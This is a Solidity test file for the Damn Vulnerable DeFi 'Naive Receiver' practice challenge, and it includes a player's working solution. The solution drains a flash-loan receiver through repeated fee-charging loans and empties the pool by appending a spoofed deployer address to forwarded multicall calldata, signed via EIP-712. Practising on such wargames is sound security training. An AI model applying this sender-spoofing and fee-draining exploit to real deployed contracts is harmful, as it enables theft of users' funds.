// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";


contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    
    function test_naiveReceiver() public {
        bytes[] memory callDatas = new bytes[](11);
        for(uint8 i; i<10; i++){
            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));        
        bytes memory message = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: message,
            deadline: 1 days
        });

        /*
        "\x19\x01": Ini adalah urutan byte yang digunakan dalam EIP-712 sebagai bagian dari prefiks yang ditambahkan pada pesan sebelum proses penandatanganan. Prefiks ini membantu memastikan bahwa tanda tangan yang dibuat hanya berlaku untuk format pesan tertentu dan tidak dapat digunakan untuk jenis pesan lainnya.
        "\x19": Ini adalah byte yang menunjukkan bahwa pesan ini menggunakan format EIP-191, yang adalah standar Ethereum untuk penandatanganan pesan.
        "\x01": Ini adalah byte yang menunjukkan bahwa format pesan yang digunakan adalah EIP-712.
        forwarder.domainSeparator(): Ini adalah nilai yang mewakili domain yang mengidentifikasi kontrak atau aplikasi yang membuat tanda tangan.
        forwarder.getDataHash(request): Ini adalah hash dari data yang ingin ditandatangani.
        */

       bytes32 messageHash = keccak256(abi.encodePacked(
        "\x19\x01", // mengikuti aturan eip712
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
       ));

       (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
